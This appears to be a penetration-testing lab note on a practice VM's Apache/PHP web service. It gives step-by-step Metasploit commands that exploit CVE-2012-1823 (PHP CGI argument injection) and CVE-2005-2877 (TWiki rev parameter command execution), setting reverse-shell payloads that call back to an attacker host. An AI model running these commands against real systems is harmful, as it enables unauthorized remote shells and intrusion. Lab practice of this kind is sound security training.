
## Port 80 | http (Apache/PHP)

https://www.youtube.com/watch?v=Lqfo21BsKv4

### Attack Vector #1 

CVE-2012-1823

PHP CGI Argument Injection

http://192.168.50.7/phpinfo.php

When run as a CGI, PHP up to version 5.3.12 and 5.4.2 is vulnerable to an argument injection vulnerability.
```
> use exploit/multi/http/php_cgi_arg_injection
> set rhost 192.168.50.7

> set payload php/meterpreter/reverse_tcp
> set lhost 192.168.50.6

> exploit

> getuid
> sysinfo
```
### Attack Vector #2 

CVE-2005-2877

TWiki History TWikiUsers rev Parameter Command Execution
```
> use exploit/unix/webapp/twiki_history
> set rhost 192.168.50.7

> set payload cmd/unix/reverse
> set lhost 192.168.50.6

> exploit

id
```

